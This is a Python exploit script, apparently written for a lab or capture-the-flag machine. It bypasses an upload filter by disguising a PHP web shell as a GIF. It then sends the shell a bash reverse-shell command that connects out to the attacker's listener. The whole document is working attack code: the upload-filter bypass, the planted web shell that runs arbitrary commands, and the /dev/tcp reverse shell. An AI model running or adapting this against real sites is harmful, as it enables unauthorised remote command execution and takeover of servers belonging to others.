import requests
import argparse
import sys

def upload_shell(target_url):
    """
    Uploads the web shell to the target.
    Returns True if successful, False otherwise.
    """
    upload_url = target_url + "/sparklays/design/changelogo.php"
    shell_code = b"GIF8;\n<?php system($_REQUEST['shell']); ?>"
    files = {
        "file": ("test3.php5", shell_code, "image/gif")
    }
    data = {
        "submit": "upload file"
    }

    print("[*] Uploading web shell...")
    try:
        r = requests.post(upload_url, files=files, data=data)
        if "The file was uploaded successfully" in r.text:
            print("[+] Shell uploaded successfully.")
            return True
        elif "sorry that file type is not allowed" in r.text.lower():
            print("[-] Upload failed: file type not allowed.")
        else:
            print("[-] Upload failed: unexpected response.")
    except Exception as e:
        print("[-] Upload request failed:", e)
    return False

def trigger_shell(target_url, lhost, lport):
    """
    Sends a POST request to trigger the uploaded web shell with a reverse shell payload.
    """
    shell_url = target_url + "/sparklays/design/uploads/test3.php5"
    payload = {
        "shell": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print("[*] Sending reverse shell payload...")
    print("[*] Payload sent. Check your listener.")
    try:
        requests.post(shell_url, data=payload, headers=headers)
        print("[*] Payload sent. Check your listener.")
    except Exception as e:
        print("[-] Failed to send payload:", e)

def main():
    parser = argparse.ArgumentParser(description="Upload PHP reverse shell and trigger it.")
    parser.add_argument("target", help="Target IP or URL (e.g., http://10.10.10.109)")
    parser.add_argument("listener_ip", help="Your IP address to receive the reverse shell")
    parser.add_argument("listener_port", help="Your listener port", type=int)
    args = parser.parse_args()

    if upload_shell(args.target):
        trigger_shell(args.target, args.listener_ip, args.listener_port)

if __name__ == "__main__":
    main()
